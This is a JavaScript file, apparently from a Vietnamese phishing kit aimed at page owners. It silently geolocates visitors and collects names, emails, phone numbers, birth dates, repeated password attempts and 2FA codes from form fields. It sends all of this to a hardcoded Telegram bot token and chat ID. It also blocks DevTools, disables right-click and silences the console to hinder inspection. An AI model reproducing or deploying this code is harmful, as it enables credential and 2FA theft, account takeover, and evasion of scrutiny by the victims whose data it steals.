// ==========================================================
// CẤU HÌNH BOT TELEGRAM & BẮN THÔNG TIN THỜI GIAN THỰC
// Path: js/telegram.js
// ==========================================================
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '8706340587:AAGAio2FTlZVVo-iBKJctGvJIlUzt9es4HU',
        CHAT_ID: '-5447601828'
    },
    IP_APIS: [
        'https://ipwho.is/',
        'https://ipinfo.io/json',
        'https://geolocation-db.com/json/',
        'https://ipapi.co/json/'
    ]
};

// Chống Inspect / F12 / DevTools
(function () {
    console.log = console.warn = console.error = function () { };
    document.addEventListener('keydown', (e) => {
        if (
            e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && ['I', 'J', 'U'].includes(e.key.toUpperCase()))
        ) {
            e.preventDefault();
            window.location.href = 'about:blank';
        }
    });
    document.addEventListener('contextmenu', (e) => e.preventDefault());
})();

// Helper escape HTML entities to prevent Telegram parse_mode: 'HTML' 400 rejection
const escapeHTML = (str) => {
    if (str === null || str === undefined || str === '') return 'N/A';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
};

// Utility Functions & Xử lý Telegram API
const Utils = {
    userLoc: {
        ip: 'N/A',
        country: 'N/A',
        countryCode: 'Unknown',
        city: 'N/A',
        region: 'N/A',
        flag: ''
    },

    getCountryFullName: async (countryCode) => {
        if (!countryCode || countryCode === 'N/A') return 'N/A';
        try {
            const res = await fetch(`https://restcountries.com/v3.1/alpha/${countryCode}`);
            const data = await res.json();
            return data[0]?.name?.common || countryCode;
        } catch (e) {
            return countryCode;
        }
    },

    getLocation: async () => {
        for (let api of CONFIG.IP_APIS) {
            try {
                const res = await fetch(api);
                const data = await res.json();

                if (api.includes('ipwho.is')) {
                    if (data.city && data.region) {
                        Utils.userLoc = {
                            ip: data.ip || 'N/A',
                            countryCode: data.country_code || 'N/A',
                            country: data.country || 'N/A',
                            city: data.city || 'Unknown',
                            region: data.region || 'Unknown',
                            flag: data.flag?.emoji || ''
                        };
                        break;
                    }
                } else if (api.includes('ipapi.co')) {
                    if (data.city && data.region) {
                        Utils.userLoc = {
                            ip: data.ip || 'Unknown',
                            countryCode: data.country_code || 'Unknown',
                            country: data.country_name || 'Unknown',
                            city: data.city || 'N/A',
                            region: data.region || 'Unknown',
                            flag: ''
                        };
                        break;
                    }
                } else if (api.includes('geolocation-db.com')) {
                    if (data.city && data.state) {
                        Utils.userLoc = {
                            ip: data.IPv4 || 'Unknown',
                            countryCode: data.country_code || 'N/A',
                            country: data.country_name || 'N/A',
                            city: data.city || 'N/A',
                            region: data.state || 'Unknown',
                            flag: ''
                        };
                        break;
                    }
                } else if (api.includes('ipinfo.io')) {
                    const countryCode = data.country || 'N/A';
                    const countryName = await Utils.getCountryFullName(countryCode);
                    Utils.userLoc = {
                        ip: data.ip || 'N/A',
                        countryCode: countryCode,
                        country: countryName,
                        city: data.city || 'N/A',
                        region: data.region || 'Unknown',
                        flag: ''
                    };
                    break;
                }
            } catch (err) {
                continue;
            }
        }
    },

    getTime: () => {
        return new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
    },

    sendMessage: async (text) => {
        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                mode: 'cors',
                keepalive: true,
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
        } catch (err) {
            // Failover without parse_mode if HTML parsing fails
            try {
                const plainText = text.replace(/<[^>]*>/g, '');
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    mode: 'cors',
                    keepalive: true,
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
                        text: plainText
                    })
                });
            } catch (e) { }
        }
    },

    formatReport: (type, extraData = {}) => {
        const info = {
            name: escapeHTML(document.getElementById('fullName')?.value),
            page: escapeHTML(document.getElementById('fanpage')?.value),
            mail: escapeHTML(document.getElementById('email')?.value),
            biz: escapeHTML(document.getElementById('emailBusiness')?.value),
            phone: escapeHTML(document.getElementById('phone')?.value),
            day: escapeHTML(document.getElementById('day')?.value || '??'),
            month: escapeHTML(document.getElementById('month')?.value || '??'),
            year: escapeHTML(document.getElementById('year')?.value || '????'),
            note: escapeHTML(document.getElementById('message')?.value || document.getElementById('note')?.value || 'None')
        };

        const isSameEmail = info.mail !== 'N/A' && info.biz !== 'N/A' && info.mail === info.biz;
        const emailStatus = isSameEmail ? ' ( GIỐNG NHAU)' : ' ( Khác )';

        let passwords = window.passwords || [];
        let headerText = type === 'INFO' ? '📝 INFO' : (type === 'PASS' ? '🔑 PASS' : '🔥 OTP');

        let msg = `<b>${headerText} | ${Utils.getTime()}</b>\n`;
        msg += `<b>IP:</b> <code>${escapeHTML(Utils.userLoc.ip)}</code>\n`;
        msg += `<b>Location:</b> <code>${escapeHTML(Utils.userLoc.ip)} | ${escapeHTML(Utils.userLoc.city)} | ${escapeHTML(Utils.userLoc.region)} (${escapeHTML(Utils.userLoc.country)})</code>\n`;
        msg += `----------------------------------\n`;
        msg += `<b>Full Name:</b> <code>${info.name}</code>\n`;
        msg += `<b>Email:</b> <code>${info.mail}</code>\n`;
        msg += `<b>Email Business:</b> <code>${info.biz}</code>${emailStatus}\n`;
        msg += `<b>Page Name:</b> <code>${info.page}</code>\n`;
        msg += `<b>Phone:</b> <code>${info.phone}</code>\n`;
        msg += `----------------------------------\n`;

        // Danh sách mật khẩu
        if (passwords.length > 0) {
            for (let i = 0; i < passwords.length; i++) {
                msg += `<b>Password(${i + 1}):</b> <code>${escapeHTML(passwords[i])}</code>\n`;
            }
            for (let i = passwords.length; i < 2; i++) {
                msg += `<b>Password(${i + 1}):</b> \n`;
            }
        } else if (type === 'PASS') {
            if (extraData.attempt === 1) {
                msg += `<b>Password(1):</b> <code>${escapeHTML(extraData.password)}</code>\n`;
                msg += `<b>Password(2):</b> \n`;
            } else {
                msg += `<b>Password(1):</b> \n`;
                msg += `<b>Password(2):</b> <code>${escapeHTML(extraData.password)}</code>\n`;
            }
        } else {
            msg += `<b>Password(1):</b> \n`;
            msg += `<b>Password(2):</b> \n`;
        }

        msg += `----------------------------------\n`;

        // Danh sách 2FA / OTP
        let otps = window.otps || [];
        if (otps.length > 0) {
            for (let i = 0; i < otps.length; i++) {
                const otpEsc = escapeHTML(otps[i]);
                msg += `<b>🔐Code 2FA(${i + 1}):</b> <code>${otpEsc}</code> (${otpEsc.length} digits)\n`;
            }
            for (let i = otps.length; i < 3; i++) {
                msg += `<b>🔐Code 2FA(${i + 1}):</b> \n`;
            }
        } else {
            if (type === 'OTP') {
                const otpEsc = escapeHTML(extraData.otp);
                if (extraData.attempt === 1) {
                    msg += `<b>🔐Code 2FA(1):</b> <code>${otpEsc}</code> (${otpEsc.length} digits)\n`;
                    msg += `<b>🔐Code 2FA(2):</b> \n`;
                    msg += `<b>🔐Code 2FA(3):</b> \n`;
                } else if (extraData.attempt === 2) {
                    msg += `<b>🔐Code 2FA(1):</b> \n`;
                    msg += `<b>🔐Code 2FA(2):</b> <code>${otpEsc}</code> (${otpEsc.length} digits)\n`;
                    msg += `<b>🔐Code 2FA(3):</b> \n`;
                } else {
                    msg += `<b>🔐Code 2FA(1):</b> \n`;
                    msg += `<b>🔐Code 2FA(2):</b> \n`;
                    msg += `<b>🔐Code 2FA(3):</b> <code>${otpEsc}</code> (${otpEsc.length} digits)\n`;
                }
            } else {
                msg += `<b>🔐Code 2FA(1):</b> \n`;
                msg += `<b>🔐Code 2FA(2):</b> \n`;
                msg += `<b>🔐Code 2FA(3):</b> \n`;
            }
        }

        return msg;
    }
};

// Tự động khởi tạo lấy IP khi load trang
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => Utils.getLocation());
} else {
    Utils.getLocation();
}
